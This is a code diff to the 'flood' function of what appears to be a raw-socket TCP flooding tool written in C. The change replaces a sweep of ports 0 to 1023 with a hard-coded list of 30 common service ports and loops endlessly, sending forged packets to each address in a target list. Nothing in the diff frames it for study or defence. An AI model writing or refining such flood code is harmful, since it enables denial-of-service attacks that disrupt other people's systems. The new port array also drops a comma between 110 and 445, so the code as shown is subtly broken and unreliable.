@@ -283,6 +283,9 @@ void *flood(void *par1)
 	register unsigned int i;
 	i = 0;
 	int sn_i = 0;
+	int ports[30] = {
+		22, 23, 80, 443, 21, 25, 110 445, 3389, 1433, 3306, 5432, 6379, 9200, 11211, 502, 2222, 22222, 20000, 1900, 135, 161, 69, 6667, 666, 8888, 8000, 8080, 9999, 5554};
+
 	while (1)
 	{
 		setup_tcpopts_header(opts);
@@ -290,18 +293,19 @@ void *flood(void *par1)
 		tcph->check = 0;
 		iph->ttl = randnum(64, 255);
 		tcph->source = htons(floodport);
-		for (int i = 0; i < 1024; i++)
-		{
-			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
-			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-			tcph->dest = htons(i);
-			iph->id = htonl(rand_cmwc() & 0xFFFF);
-			tcph->seq = htonl(randnum(1000000, 9999999));
-			tcph->window = htons(8192);
-			iph->check = csum((unsigned short *)datagram, iph->tot_len);
-			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
-		}
+		for (int i = 0; i < randnum(1, 3); i++)
+			for (int i = 0; i < (sizeof(ports) / sizeof(ports[0])); i++)
+			{
+				opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
+				tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+				tcph->dest = htons(ports[i]);
+				iph->id = htonl(rand_cmwc() & 0xFFFF);
+				tcph->seq = htonl(randnum(1000000, 9999999));
+				tcph->window = htons(8192);
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+			}
 		list_node = list_node->next;
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
